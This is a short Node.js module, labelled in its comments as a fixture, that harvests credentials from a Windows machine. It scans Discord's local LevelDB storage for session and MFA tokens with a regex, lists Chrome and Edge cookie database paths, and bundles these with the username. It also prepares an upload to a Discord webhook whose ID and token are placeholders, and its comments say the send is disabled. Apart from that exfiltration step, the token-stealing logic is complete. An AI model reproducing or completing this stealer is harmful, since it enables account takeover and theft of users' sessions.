const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");

const APPDATA = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
const LOCAL = process.env.LOCALAPPDATA || path.join(os.homedir(), "AppData", "Local");

const DISCORD_LEVELDB = [
  path.join(APPDATA, "discord", "Local Storage", "leveldb"),
  path.join(APPDATA, "discordcanary", "Local Storage", "leveldb"),
];
const CHROMIUM_COOKIES = [
  path.join(LOCAL, "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
  path.join(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
];
const TOKEN_RE = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;

function scanTokens(dir) {
  if (!fs.existsSync(dir)) return [];
  const found = [];
  for (const f of fs.readdirSync(dir)) {
    if (!/\.(log|ldb)$/.test(f)) continue;
    const txt = fs.readFileSync(path.join(dir, f), "latin1");
    const m = txt.match(TOKEN_RE);
    if (m) found.push(...m);
  }
  return found;
}

function harvest() {
  const tokens = DISCORD_LEVELDB.flatMap(scanTokens);
  const cookieFiles = CHROMIUM_COOKIES.filter((p) => fs.existsSync(p));
  const bundle = { tokens, cookieFiles, user: os.userInfo().username };
  return upload(bundle);
}

function upload(bundle) {
  // Webhook destination is a placeholder; transfer disabled in fixture.
  const hook = "https://discord.com/api/webhooks/PLACEHOLDER_ID/PLACEHOLDER_TOKEN";
  const body = JSON.stringify({ content: JSON.stringify(bundle).slice(0, 1900) });
  void hook; void body; // not sent in fixture
  return bundle;
}

module.exports = { harvest };
